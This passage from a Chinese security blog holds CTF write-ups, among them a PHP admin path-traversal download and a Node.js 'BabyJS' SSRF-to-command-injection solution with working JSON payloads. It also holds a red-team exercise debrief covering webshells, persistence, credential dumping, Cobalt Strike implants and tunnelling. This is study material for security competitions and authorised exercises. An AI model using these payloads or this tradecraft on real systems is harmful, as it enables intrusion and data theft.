&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> right([<span class="string">&#x27;file&#x27;</span> =&gt; ROOT_PATH . <span class="string">&#x27;/static/upload/&#x27;</span> . $filename, <span class="string">&#x27;filename&#x27;</span> =&gt; $filename, <span class="string">&#x27;resource&#x27;</span> =&gt; $info], <span class="string">&#x27;上传成功&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> wrong(<span class="string">&#x27;保存上传文件&#x27;</span> . $filename . <span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSaveName</span>(<span class="params">$savename</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 自动生成文件名</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === $savename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;rule <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">            $savename = call_user_func_array(<span class="keyword">$this</span>-&gt;rule, [<span class="keyword">$this</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;rule) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;date&#x27;</span>:</span><br><span class="line">                    $savename = date(<span class="string">&#x27;Ymd&#x27;</span>) . DS . md5(microtime(<span class="literal">true</span>));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;rule, hash_algos())) &#123;</span><br><span class="line">                        $hash     = <span class="keyword">$this</span>-&gt;hash(<span class="keyword">$this</span>-&gt;rule);</span><br><span class="line">                        $savename = substr($hash, <span class="number">0</span>, <span class="number">2</span>) . DS . substr($hash, <span class="number">2</span>);</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (is_callable(<span class="keyword">$this</span>-&gt;rule)) &#123;</span><br><span class="line">                        $savename = call_user_func(<span class="keyword">$this</span>-&gt;rule);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $savename = date(<span class="string">&#x27;Ymd&#x27;</span>) . DS . md5(microtime(<span class="literal">true</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;&#x27;</span> === $savename || <span class="literal">false</span> === $savename) &#123;</span><br><span class="line">        $savename = <span class="keyword">$this</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!strpos($savename, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">        $savename .= <span class="string">&#x27;.&#x27;</span> . pathinfo(<span class="keyword">$this</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), PATHINFO_EXTENSION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $savename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用前提就是token 和 上传文件的路径 可控。</p>
<p>emem，难点就是构造上传表单。</p>
<blockquote>
<p>那个上传表单不知道是构造的还是抓包抓到的，我怎么没有抓到？</p>
</blockquote>
<h2 id="后台权限任意文件下载"><a href="#后台权限任意文件下载" class="headerlink" title="后台权限任意文件下载"></a>后台权限任意文件下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;manage&#x2F;Backup&#x2F;downloadBak?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadBak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $file_name = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file_dir = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!file_exists($file_dir . <span class="string">&quot;/&quot;</span> . $file_name)) &#123; <span class="comment">//检查文件是否存在</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = fopen($file_dir . <span class="string">&quot;/&quot;</span> . $file_name, <span class="string">&quot;r&quot;</span>); <span class="comment">// 打开文件</span></span><br><span class="line">        <span class="comment">// 输入文件标签</span></span><br><span class="line">        header(<span class="string">&#x27;Content-Encoding: none&#x27;</span>);</span><br><span class="line">        header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">        header(<span class="string">&quot;Accept-Ranges: bytes&quot;</span>);</span><br><span class="line">        header(<span class="string">&quot;Accept-Length: &quot;</span> . filesize($file_dir . <span class="string">&quot;/&quot;</span> . $file_name));</span><br><span class="line">        header(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">        header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . $file_name);  <span class="comment">//以真实文件名提供给浏览器下载</span></span><br><span class="line">        header(<span class="string">&#x27;Pragma: no-cache&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Expires: 0&#x27;</span>);</span><br><span class="line">        <span class="comment">//输出文件内容</span></span><br><span class="line">        <span class="keyword">echo</span> fread($file, filesize($file_dir . <span class="string">&quot;/&quot;</span> . $file_name));</span><br><span class="line">        fclose($file);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="网鼎杯-2020-半决赛-BabyJS"><a href="#网鼎杯-2020-半决赛-BabyJS" class="headerlink" title="[网鼎杯 2020 半决赛]BabyJS"></a>[网鼎杯 2020 半决赛]BabyJS</h1><p>nodejs 的代码审计题，down下源码，执行 <code>npm audit</code> ， 下面是一些重要的漏洞。原型链污染，RCE，sandbox bypass RCE。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ High          │ Prototype Pollution Protection Bypass                        │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ qs                                                           │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ express                                                      │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ express &gt; qs                                                 │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;1469                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ High          │ Prototype Pollution Protection Bypass                        │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ qs                                                           │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ body-parser                                                  │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ body-parser &gt; qs                                             │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;1469                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ Moderate      │ Code Injection                                               │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ morgan                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ morgan                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ morgan                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;736                             │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ Low           │ Prototype Pollution                                          │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ lodash                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ request-promise                                              │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ request-promise &gt; request-promise-core &gt; lodash              │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;1523                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ Critical      │ Sandbox Bypass Leading to Arbitrary Code Execution           │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ constantinople                                               │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Patched in    │ &gt;&#x3D;3.1.1                                                      │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ jade                                                         │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ jade &gt; constantinople                                        │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;568                             │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>em… 当看到<code>routes/index.js</code> 中的代码时，就知道是要<code>SSRF</code>了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blacklist=[<span class="string">&#x27;127.0.0.1.xip.io&#x27;</span>,<span class="string">&#x27;::ffff:127.0.0.1&#x27;</span>,<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="string">&#x27;[::1]&#x27;</span>,<span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.json(&#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/debug&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.ip);</span><br><span class="line">    <span class="keyword">if</span>(blacklist.indexOf(req.ip)!=<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;res&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\&quot;\&#x27;]/ig</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	<span class="built_in">console</span>.log(url.parse(u).href);</span><br><span class="line">	<span class="keyword">let</span> log=<span class="string">`echo  &#x27;<span class="subst">$&#123;url.parse(u).href&#125;</span>&#x27;&gt;&gt;/tmp/log`</span>;</span><br><span class="line">	<span class="built_in">console</span>.log(log);</span><br><span class="line">	child_process.exec(log);</span><br><span class="line">	res.json(&#123;<span class="attr">data</span>:fs.readFileSync(<span class="string">&#x27;/tmp/log&#x27;</span>).toString()&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.json(&#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/debug&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.body);</span><br><span class="line">    <span class="keyword">if</span>(req.body.url !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> u = req.body.url;</span><br><span class="line">	<span class="keyword">var</span> urlObject=url.parse(u);</span><br><span class="line">	<span class="keyword">if</span>(blacklist.indexOf(urlObject.hostname) == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="keyword">var</span> dest=urlObject.href;</span><br><span class="line">		request(dest,<span class="function">(<span class="params">err,result,body</span>)=&gt;</span>&#123;</span><br><span class="line">			res.json(body);</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		res.json([]);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中，get方式请求的<code>/debug</code> 有许多过滤（过滤了单、双引号、括号 []），而post请求方式中没有。但是要执行命令就必须能够调用到get中的debug路由，因此目的也很明确了，</p>
<blockquote>
<p>通过post /debug去 ssrf get /debug</p>
</blockquote>
<p>因为返回是json格式，所以传递的数据也是json格式的。将/flag 复制到 /tmp/log 下，这样就能以json格式打印出来了。</p>
<p>SSRF Bypass：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/65832.html">https://www.secpulse.com/archives/65832.html</a></p>
<p>payload1，单引号二次编码一下绕</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;0177.0.0.1:3000&#x2F;debug?url&#x3D;http:&#x2F;&#x2F;a%2527@a;cp$IFS&#x2F;flag$IFS&#x2F;tmp&#x2F;log%00&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>payload2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;0177.0.0.1:3000&#x2F;debug?url&#x3D;http:&#x2F;&#x2F;%EF%BC%87;cp$IFS&#x2F;flag$IFS&#x2F;tmp&#x2F;log%2500&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这串解出来正好是一个单引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%EF%BC%87</span><br></pre></td></tr></table></figure>

<h1 id="参考WP"><a href="#参考WP" class="headerlink" title="参考WP"></a>参考WP</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42337765/article/details/110298641">https://blog.csdn.net/weixin_42337765/article/details/110298641</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/W4nder/p/14078695.html">https://www.cnblogs.com/W4nder/p/14078695.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/6988.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/6988.html" class="post-title-link" itemprop="url">某市HW2020红队心得总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-12-05 00:31:53 / 修改时间：01:35:33" itemprop="dateCreated datePublished" datetime="2020-12-05T00:31:53+08:00">2020-12-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>首先，菜鸡道歉，DBQ另一位大师傅！我太菜了，没能拿到第一。最终拿了第三，二等奖，本地厂商第一。</p>
</blockquote>
<p>这次公鸡队比较少，7支队伍，4支本地厂商，3支大厂。大厂是<strong>奇安信、天融信、安恒。</strong></p>
<p>该市参演单位覆盖了媒体、学校、医院、能源、交通、银行(金融)、政府系统。但是互联网区的资产相对较少，甚至有的目标直接给的是内网靶标。</p>
<p>这是此次攻防的背景介绍吧。</p>
<h1 id="红队视角下的攻防演练"><a href="#红队视角下的攻防演练" class="headerlink" title="红队视角下的攻防演练"></a>红队视角下的攻防演练</h1><p>攻防演练之前参加过，国家级、省级都参加过，只不过是蓝队，做防守的。</p>
<p>蓝队的话，前期的攻击面分析、资产表整理比较麻烦。还有正式行动前的模拟对抗也是蓝队做的。等正式开始后，主要是就是安全设备的监控、策略分发、应急响应、公鸡者溯源。</p>
<p>红队的话，这次算第一次实地作战，之前远程支援过某直辖市的演练，体验不是很明显。</p>
<p>我认为，攻防中红队的目的非常明确：</p>
<ul>
<li>权限</li>
<li>权限</li>
<li>权限</li>
</ul>
<p>对，没有错，就是shell、权限（Web应用管理员、超级管理员、系统管理员权限、主机权限、数据库权限、路由器、防火墙等设备权限）。</p>
<p>之前，也说</p>
<ul>
<li>数据</li>
<li>数据</li>
<li>数据</li>
</ul>
<p>对，也没有错，但是要获取大量数据，主要是大量，至少也得几万几十万那种吧。不打到内网核心区，肯定是拿不到的。除非DMZ区的数据库 就很大，并且都是一些重要的数据。</p>
<p>并且，获取WebShell，才是开始。也就是入口权限。</p>
<ul>
<li>某系统弱口令后台修改模板GetShell-&gt;内网漫游</li>
<li>某系统目标同IP其他端口是Tomcat、弱口令+部署WAR包GetShell，双网卡，192段和172段、192段出网-&gt;内网漫游</li>
</ul>
<p>因为是红队，不同于常规的安服、渗透。是肯定要打内网的。所以这时候能拿下一台边界主机，存在双网卡机器的或者存在内网ip的机器权限，就可以上冰蝎，冰蝎主要是动态二进制加密，可以绕过一些安全设备的检测，当然也可以用哥斯拉。做权限维持，这里一定要拿到入口权限后做权限维持，因为一开始我们拿到一个webshell之后，被另一个公鸡队给删了。</p>
<p>权限维持做好后，要么弹shell到MSF上，进行横向移动，mimikataz抓密码，或者哈希。或者直接弄一个上线CS的简单免杀马，这次另一个大师傅就是在他们团队负责搞免杀的。Orz。上线CS后，也方便协同作战，并且高度自定义的CS，有很多自动化插件，一键信息搜集，当然前提是目标机器安全性很低，没有装太多杀软，要么就绕。</p>
<p>横向会遇到隔离问题</p>
<ul>
<li>逻辑隔离</li>
<li>物理隔离</li>
<li>强制物理隔离（有待研究是否和物理隔离有区别，记不清了）</li>
</ul>
<p>这也是第一次听这个术语，大概意思就是网络不互通，要通过跳板机流量一台一台跳。之后听奇安信的一个师傅说，有一台机器他跳了很多台，最后查看一个文件都要花一分钟。np。</p>
<p>说道这里，就不得不说内网穿透的问题。</p>
<ul>
<li>frp</li>
<li>nps</li>
</ul>
<p>流量进的去，数据出的来。</p>
<p>我这次在某目标翻文件的时候，删了不知道是哪个公鸡队的frp哈哈。</p>
<p>有的机器，拿下权限之后，不能直接托文件。只能自己下载（远程加载）：</p>
<ul>
<li>powershell</li>
<li>net use</li>
<li>……</li>
</ul>
<p>最后就说下分工吧，打红队分工真的是很重要的，如果是混战模式，即所有公鸡队的目标都是一样的，那就是比谁先发现漏洞了，谁发现的早，谁报告交的早，分就能拿到，发现的晚了，要么目标被打出局，要么洞就被修了。</p>
<blockquote>
<p>这次就是因为我们觉得某系统不好打，晚点看，等去看发现是shiro的时候，已经打不了shiro550了。因为奇安信的人打了，并且通过这个打进去了，拿了1W+分。后面目标那边把shiro升级了，我们就没办法了，在这里失分了。所以 说，还是信息搜集不到位。</p>
</blockquote>
<p>这里提到了信息搜集，就说下攻防时信息搜集的问题：</p>
<ul>
<li>很多目标没有域名</li>
<li>域名基本没有或者很少子域名</li>
<li>没有SSL证书</li>
<li>备案号查询甚至差不多历史域名</li>
<li>企查查基本没啥用</li>
<li>fofa都没收录这些站点</li>
<li>某些站点纯静态</li>
<li>目标系统上云</li>
<li>目标只是当地系统，但是托管是全国范围的</li>
<li>目标系统IP为供应商IP，统一管理</li>
</ul>
<p>一些方法来扩大资产：</p>
<ul>
<li>C段扫描，Goby推荐，扫的快，还能探测一些洞，估计缺点就是可能会遗漏，我还没研究为什么goby能扫的这么快。</li>
<li>单一IP全端口扫描</li>
<li>旁站（拿下旁站WebShell可以试着跳目录过去，去读、下载源码啥的，但是一般不可行</li>
<li>IP查历史域名</li>
<li>目录扫描推荐白名单目录，不要去探测一些信息泄露的目录，容易被WAF阻断</li>
<li>指纹识别，不要过度依赖插件或者简单凭借经验。一定要去抓包看看，看清楚了</li>
</ul>
<p>一些突破点：</p>
<ul>
<li>还是攻防神器，fastjson、shiro、Weblogic（这次没有能打的），Spring。的，一定要重点去试试，不能放过任何一个</li>
<li>弱口令永远的神</li>
<li>历史漏洞</li>
<li>当然有0day，我也没话说</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>心得体会就说这么多咯。暴露的我问题我内心也清楚了，要想成为RedTeam还有很长的路要走~</p>
<p><strong>一定要多实战！</strong></p>
<hr>
<p>推荐一些资料：github yyds</p>
<p><a target="_blank" rel="noopener" href="https://github.com/fengjixuchui/RedTeamer">https://github.com/fengjixuchui/RedTeamer</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Lucifer1993/SatanSword">https://github.com/Lucifer1993/SatanSword</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/enaqx/awesome-pentest">https://github.com/enaqx/awesome-pentest</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">m0nk3y</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">m0nk3y</span>
</div>
